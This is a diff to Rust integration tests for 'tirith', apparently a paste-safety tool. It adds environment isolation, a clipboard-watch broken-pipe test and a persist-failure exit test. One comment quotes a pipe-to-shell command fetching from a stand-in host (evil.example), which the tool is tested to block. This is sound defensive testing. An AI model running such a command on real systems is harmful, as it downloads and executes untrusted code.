@@ -12020,6 +12020,10 @@ fn paste_with_source_attributes_and_flags_high_mismatch_with_pipe() {
         .env("XDG_DATA_HOME", data.path())
         .env("APPDATA", state.path())
         .env("LOCALAPPDATA", state.path())
+        // Pin discovery off any ambient repo policy: an inherited
+        // `TIRITH_POLICY_ROOT` (e.g. an allowlist/severity override) could change
+        // the finding set and make the assertions flaky.
+        .env_remove("TIRITH_POLICY_ROOT")
         .stdin(std::process::Stdio::piped())
         .stdout(std::process::Stdio::piped())
         .stderr(std::process::Stdio::piped())
@@ -12089,6 +12093,9 @@ fn paste_with_source_no_companion_file_is_graceful_noop() {
         .env("XDG_DATA_HOME", data.path())
         .env("APPDATA", data.path())
         .env("LOCALAPPDATA", data.path())
+        // Pin discovery off any ambient repo policy so the baseline finding set
+        // below cannot be altered by an inherited `TIRITH_POLICY_ROOT`.
+        .env_remove("TIRITH_POLICY_ROOT")
         .stdin(std::process::Stdio::piped())
         .stdout(std::process::Stdio::piped())
         .stderr(std::process::Stdio::piped())
@@ -12122,6 +12129,85 @@ fn paste_with_source_no_companion_file_is_graceful_noop() {
             .any(|f| f["rule_id"] == "paste_source_mismatch"),
         "paste_source_mismatch must not fire without a companion record; got:\n{parsed}"
     );
+
+    // PIN the baseline paste verdict so this control proves "graceful provenance
+    // no-op PLUS normal paste analysis still runs" — not merely "no provenance
+    // finding". `curl https://evil.example/install.sh | bash` is a dangerous
+    // pipe-to-shell paste, so the process must exit 1 (Block) AND a normal
+    // pipe-to-interpreter / curl-pipe-shell finding must still be present.
+    assert_eq!(
+        out.status.code(),
+        Some(1),
+        "a dangerous paste must still Block (exit 1) on the no-companion path; stderr:\n{}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+    assert!(
+        findings.iter().any(|f| {
+            matches!(
+                f["rule_id"].as_str(),
+                Some("pipe_to_interpreter") | Some("curl_pipe_shell")
+            )
+        }),
+        "normal dangerous-paste analysis must still run (expected a pipe-to-shell \
+         finding) even when the provenance companion is absent; got:\n{parsed}"
+    );
+}
+
+/// Round-3 regression (#5): `tirith clipboard watch --json` must EXIT (not poll
+/// forever) when its stdout write fails because the reader closed the pipe. We
+/// spawn it, DROP the stdout read end immediately, and bound the wait: the first
+/// `watch_start` JSON line hits a closed pipe, so the child stops — via SIGPIPE on
+/// Unix (per `main::run`'s SIG_DFL reset) or the explicit `return 0` broken-pipe
+/// branch elsewhere. Either way it must not hang. Unix-only: the bounded-wait
+/// helper and the close-the-pipe maneuver are exercised where SIGPIPE applies; the
+/// `return 0` branch is the cross-platform safety net for the same condition.
+#[cfg(unix)]
+#[test]
+fn clipboard_watch_exits_when_stdout_pipe_closed() {
+    use std::sync::mpsc;
+
+    // Isolate state_dir() so `source_file_path()` resolves (otherwise watch exits
+    // 1 before the watch_start write) without touching the real home.
+    let state = tempfile::tempdir().expect("state tempdir");
+
+    let mut child = tirith()
+        .args(["clipboard", "watch", "--json"])
+        .env("XDG_STATE_HOME", state.path())
+        .env("APPDATA", state.path())
+        .env("LOCALAPPDATA", state.path())
+        .stdin(std::process::Stdio::null())
+        .stdout(std::process::Stdio::piped())
+        .stderr(std::process::Stdio::piped())
+        .spawn()
+        .expect("spawn tirith clipboard watch");
+
+    // Close the read end of stdout NOW: the child's first `watch_start` write
+    // then fails (broken pipe), which must terminate it rather than spin the
+    // poll loop forever.
+    drop(child.stdout.take());
+
+    // Bound the wait so a regression (ignored write error → infinite poll) fails
+    // the test instead of hanging the suite.
+    let (tx, rx) = mpsc::channel();
+    std::thread::spawn(move || {
+        let _ = tx.send(child.wait());
+    });
+    match rx.recv_timeout(std::time::Duration::from_secs(20)) {
+        Ok(status) => {
+            let status = status.expect("wait");
+            // SIGPIPE-terminated (no code) OR a clean exit via the broken-pipe
+            // `return 0` branch — both are acceptable "it stopped" outcomes. What
+            // matters is that it EXITED.
+            assert!(
+                !status.success() || status.code() == Some(0),
+                "watch must stop on a closed stdout pipe; status: {status:?}"
+            );
+        }
+        Err(_) => panic!(
+            "tirith clipboard watch did not exit within 20s after its stdout pipe \
+             was closed — a broken-pipe write must stop the watcher, not spin the poll loop"
+        ),
+    }
 }
 
 // ===========================================================================
@@ -12175,6 +12261,55 @@ fn visual_audit_non_interactive_critical_exits_zero() {
     );
     assert_eq!(parsed["distinguishable"].as_u64(), Some(0));
     assert_eq!(parsed["indistinguishable"].as_u64(), Some(0));
+}
+
+/// Round-3 regression (#4): when the result PERSIST is requested
+/// (`--non-interactive` persists) but the write FAILS, `visual-audit` must exit
+/// 1 — not 0 — so CI / `tirith doctor --compat` are never told the audit was
+/// recorded when it was not. We force the failure by pointing the config dir at a
+/// path that is a regular FILE, so `create_dir_all(<file>/tirith)` cannot succeed.
+/// `config_dir()` resolves from `XDG_CONFIG_HOME` (Unix) and `%APPDATA%` (Windows
+/// via etcetera), so we pin all three at the same file path for cross-platform
+/// isolation. The JSON result is still emitted (the result is shown even unsaved).
+#[test]
+fn visual_audit_persist_failure_exits_1() {
+    // A regular file standing in for the config base dir: any attempt to create
+    // `<file>/tirith` under it must fail with "Not a directory".
+    let tmp = tempfile::tempdir().expect("tempdir");
+    let not_a_dir = tmp.path().join("config-is-a-file");
+    fs::write(&not_a_dir, b"not a directory").unwrap();
+
+    let out = tirith()
+        .args([
+            "visual-audit",
+            "--non-interactive",
+            "--pairs",
+            "critical",
+            "--json",
+        ])
+        .env("XDG_CONFIG_HOME", &not_a_dir)
+        .env("APPDATA", &not_a_dir)
+        .env("LOCALAPPDATA", &not_a_dir)
+        .stdin(std::process::Stdio::null())
+        .output()
+        .expect("failed to run tirith visual-audit");
+
+    assert_eq!(
+        out.status.code(),
+        Some(1),
+        "a requested-but-failed persist must exit 1; stderr:\n{}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+    // The result is still emitted on stdout (the operator sees the unsaved run),
+    // and stderr explains the save failure.
+    let parsed: serde_json::Value = serde_json::from_slice(&out.stdout)
+        .unwrap_or_else(|e| panic!("visual-audit --json must still be parseable: {e}"));
+    assert!(parsed["pairs_total"].as_u64().unwrap_or(0) > 0);
+    assert!(
+        String::from_utf8_lossy(&out.stderr).contains("could not save result"),
+        "stderr must explain the persist failure; got:\n{}",
+        String::from_utf8_lossy(&out.stderr)
+    );
 }
 
 /// `tirith browser install-extension --json` (dry-run) emits the manifest with
